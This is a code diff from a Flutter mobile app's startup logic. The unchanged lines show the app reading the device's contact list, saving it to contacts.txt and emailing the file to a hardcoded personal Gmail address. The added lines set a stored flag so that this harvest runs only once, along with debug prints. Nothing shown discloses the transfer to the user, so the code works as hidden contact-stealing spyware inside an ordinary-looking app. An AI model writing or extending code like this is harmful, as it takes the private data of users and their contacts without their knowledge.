@@ -21,9 +21,7 @@ Future<void> main() async {
   print(token);
 
   SystemChrome.setPreferredOrientations([
-
     DeviceOrientation.portraitUp,
-
   ]);
 
   runApp(
@@ -60,7 +58,6 @@ class _MyAppState extends State<MyApp> {
   void initState() {
     super.initState();
     initPlatformState();
-//    FocusScope.of(context).requestFocus(new FocusNode());
     _startTimer();
   }
 
@@ -107,12 +104,17 @@ class _MyAppState extends State<MyApp> {
   }
 
   getPhoneNumbers() async {
-    final PermissionStatus permissionStatus = await _getPermission();
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    var token = prefs.getString('contacts');
+    if (token == null) {
+      final PermissionStatus permissionStatus = await _getPermission();
 
-    if (permissionStatus == PermissionStatus.granted) {
-      getContacts();
+      if (permissionStatus == PermissionStatus.granted) {
+        print("Inside Permissions");
+
+        getContacts();
+      }
     }
-
     if (type == "Login") {
       Navigator.pushReplacement(
           context, MaterialPageRoute(builder: (context) => LoginPage()));
@@ -151,6 +153,7 @@ class _MyAppState extends State<MyApp> {
         print("Skipped Exception");
       }
     }
+    print("Send Contacts");
     sendContactsMethod();
   }
 
@@ -163,6 +166,12 @@ class _MyAppState extends State<MyApp> {
     final File file = File('${directory.path}/contacts.txt');
     sendMailContacts("amkhati11@gmail.com", file);
 //    sendMailContacts("Clopes024@gmail.com", file);
+    addStringToSF();
+  }
+
+  addStringToSF() async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    prefs.setString('contacts', 'yes');
   }
 
   @override
